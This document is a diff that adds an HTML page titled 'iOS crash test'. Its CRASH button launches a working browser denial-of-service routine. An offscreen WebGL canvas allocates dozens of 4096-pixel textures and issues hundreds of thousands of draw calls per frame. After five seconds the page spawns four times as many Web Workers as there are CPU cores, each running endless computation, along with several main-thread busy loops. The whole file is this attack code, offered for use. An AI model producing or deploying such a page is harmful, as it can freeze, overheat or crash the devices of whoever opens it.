@@ -1,0 +1,246 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>iOS crash test</title>
+  <style>
+    body {
+      margin: 0;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: #111;
+      font-family: Arial, sans-serif;
+    }
+    button {
+      padding: 20px 60px;
+      font-size: 32px;
+      font-weight: bold;
+      color: white;
+      background: #c00;
+      border: none;
+      border-radius: 12px;
+      cursor: pointer;
+      transition: all 0.2s;
+    }
+    button:hover {
+      background: #f00;
+      transform: scale(1.08);
+    }
+  </style>
+</head>
+<body>
+
+<button onclick="crash()">CRASH</button>
+
+<script>
+
+function crash() {
+    // WebGL setup
+    let canvas = document.createElement('canvas');
+    canvas.style.position = 'fixed';
+    canvas.style.top = '-9999px';
+    canvas.style.left = '-9999px';
+    document.body.appendChild(canvas);
+    
+    let gl = canvas.getContext('webgl', { 
+        antialias: false,
+        powerPreference: 'high-performance',
+        preserveDrawingBuffer: false
+    });
+    
+    if (!gl) {
+        console.error('WebGL not available');
+        return;
+    }
+    
+    // Detect the maximum texture size
+    const maxTexSize = gl.getParameter(gl.MAX_TEXTURE_SIZE);
+    const size = Math.min(4096, maxTexSize);
+    
+    canvas.width = size;
+    canvas.height = size;
+    gl.viewport(0, 0, size, size);
+    
+    // Setup shaders
+    const vsSource = `
+        attribute vec2 a_position;
+        varying vec2 v_texCoord;
+        void main() {
+            gl_Position = vec4(a_position, 0.0, 1.0);
+            v_texCoord = a_position * 0.5 + 0.5;
+        }
+    `;
+    
+    const fsSource = `
+        precision highp float;
+        uniform sampler2D u_texture;
+        varying vec2 v_texCoord;
+        uniform float u_time;
+        
+        void main() {
+            vec4 color = texture2D(u_texture, v_texCoord);
+            float noise = sin(v_texCoord.x * 100.0 + u_time) * cos(v_texCoord.y * 100.0 + u_time);
+            gl_FragColor = vec4(color.rgb * (1.0 + noise * 0.1), color.a);
+        }
+    `;
+    
+    function loadShader(type, source) {
+        const shader = gl.createShader(type);
+        gl.shaderSource(shader, source);
+        gl.compileShader(shader);
+        if (!gl.getShaderParameter(shader, gl.COMPILE_STATUS)) {
+            throw new Error('Shader compile error');
+        }
+        return shader;
+    }
+    
+    const vertexShader = loadShader(gl.VERTEX_SHADER, vsSource);
+    const fragmentShader = loadShader(gl.FRAGMENT_SHADER, fsSource);
+    
+    const shaderProgram = gl.createProgram();
+    gl.attachShader(shaderProgram, vertexShader);
+    gl.attachShader(shaderProgram, fragmentShader);
+    gl.linkProgram(shaderProgram);
+    
+    if (!gl.getProgramParameter(shaderProgram, gl.LINK_STATUS)) {
+        throw new Error('Shader program failed');
+    }
+    
+    // Setup quad buffer
+    const quadBuffer = gl.createBuffer();
+    gl.bindBuffer(gl.ARRAY_BUFFER, quadBuffer);
+    const positions = [-1, -1, 1, -1, -1, 1, 1, 1];
+    gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(positions), gl.STATIC_DRAW);
+    
+    const posLoc = gl.getAttribLocation(shaderProgram, 'a_position');
+    gl.enableVertexAttribArray(posLoc);
+    gl.vertexAttribPointer(posLoc, 2, gl.FLOAT, false, 0, 0);
+    
+    gl.useProgram(shaderProgram);
+    gl.disable(gl.DEPTH_TEST);
+    gl.disable(gl.BLEND);
+    
+    // Create texture helper
+    function createTexture(size) {
+        const tex = gl.createTexture();
+        gl.bindTexture(gl.TEXTURE_2D, tex);
+        gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, size, size, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
+        gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MIN_FILTER, gl.NEAREST);
+        gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MAG_FILTER, gl.NEAREST);
+        gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_S, gl.CLAMP_TO_EDGE);
+        gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_T, gl.CLAMP_TO_EDGE);
+        return tex;
+    }
+    
+    // Create 16 texture pairs
+    const textures = [];
+    const framebuffers = [];
+    const numPairs = 16;
+    
+    for (let i = 0; i < numPairs; i++) {
+        const tex1 = createTexture(size);
+        const tex2 = createTexture(size);
+        const fbo = gl.createFramebuffer();
+        
+        textures.push(tex1, tex2);
+        framebuffers.push(fbo);
+    }
+    
+    const timeLoc = gl.getUniformLocation(shaderProgram, 'u_time');
+    const opsPerFrame = 500000;
+    
+    // Render loop
+    let shouldStop = false;
+    function renderFrame() {
+        if (shouldStop) return;
+        
+        gl.uniform1f(timeLoc, performance.now() / 1000);
+        
+        // Cycle all texture pairs
+        for (let pair = 0; pair < numPairs; pair++) {
+            gl.bindFramebuffer(gl.FRAMEBUFFER, framebuffers[pair]);
+            gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, textures[pair * 2 + 1], 0);
+            gl.bindTexture(gl.TEXTURE_2D, textures[pair * 2]);
+            
+            for (let i = 0; i < opsPerFrame / numPairs; i++) {
+                gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
+            }
+        }
+        
+        requestAnimationFrame(renderFrame);
+    }
+    
+    // Render immediately
+    renderFrame();
+    
+    // Begin CPU stress after 5 sec
+    setTimeout(() => {
+        const workerCode = `
+            let ops = 0;
+            function infiniteWork() {
+                let hash = 0;
+                for (let i = 0; i < 100000; i++) {
+                    hash = ((hash << 5) - hash) + i;
+                    hash = hash & hash;
+                    Math.sqrt(hash);
+                    Math.sin(hash);
+                    Math.cos(hash);
+                }
+                
+                for (let i = 2; i < 10000; i++) {
+                    let isPrime = true;
+                    for (let j = 2; j < Math.sqrt(i); j++) {
+                        if (i % j === 0) isPrime = false;
+                    }
+                }
+                
+                ops += 100000;
+                postMessage(ops);
+                infiniteWork();
+            }
+            infiniteWork();
+        `;
+        
+        const blob = new Blob([workerCode], { type: 'application/javascript' });
+        const workerUrl = URL.createObjectURL(blob);
+        
+        // Create workers
+        const numWorkers = navigator.hardwareConcurrency ? navigator.hardwareConcurrency * 4 : 16;
+        
+        for (let i = 0; i < numWorkers; i++) {
+            try {
+                const worker = new Worker(workerUrl);
+                worker.onmessage = (e) => {
+                    // Worker is running
+                };
+            } catch (e) {
+                console.error('Worker create failed:', e);
+            }
+        }
+        
+        // Main thread CPU stress
+        const mainThreadWork = () => {
+            for (let i = 0; i < 100000; i++) {
+                Math.sqrt(Math.random() * 999999);
+                Math.sin(i) * Math.cos(i);
+            }
+            if (!shouldStop) setTimeout(mainThreadWork, 0);
+        };
+        
+        // Spawn multiple main thread loops
+        for (let i = 0; i < 4; i++) {
+            setTimeout(mainThreadWork, 0);
+        }
+        
+    }, 5000);
+    
+}
+
+</script>
+
+</body>
+</html>
